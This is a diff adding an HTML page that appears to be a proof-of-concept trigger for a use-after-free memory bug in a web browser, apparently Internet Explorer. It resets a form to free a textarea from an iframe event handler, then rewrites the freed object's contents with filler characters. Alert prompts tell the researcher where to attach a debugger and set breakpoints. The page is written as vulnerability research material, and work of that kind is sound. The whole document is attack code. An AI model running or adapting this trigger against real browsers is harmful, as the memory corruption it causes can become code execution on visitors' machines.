@@ -1,0 +1,40 @@
+<!-- saved from url=(0014)about:internet -->
+<script>
+ 
+function run() {
+  var textarea = document.getElementById("textarea");
+  var frame = document.createElement("iframe");
+  textarea.appendChild(frame);
+  frame.contentDocument.onreadystatechange = eventhandler;
+ 
+  form.reset();
+}
+ 
+function eventhandler() {
+  alert("Before Realloc and Free");
+  document.getElementById("textarea").defaultValue = "foo";
+  var x = document.createElement("INPUT");
+  x.setAttribute("type", "range");
+}
+ 
+</script>
+<body onload=run()>
+<form id="form">
+<!-- <textarea id="textarea" cols="80">aaaaaaaaaaaaaaaaaaaaaaaaa</textarea> 
+-->
+<script>alert("Before Creation of Text Area Object: Attach and set 
+breakpoints")</script>
+<textarea id="textarea" 
+cols="80">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea>
+<br><input id="clickMe" type="button" value="Replace Text With B's" 
+onclick="setBs();" />
+
+<script>
+function setBs() {
+
+	var text = document.getElementById("textarea"); 	// Getting the 
+swapped element
+	text.value = "BBBBBBBBBBBBBBBBBBBBBBBBBBB";
+	}
+	
+</script>
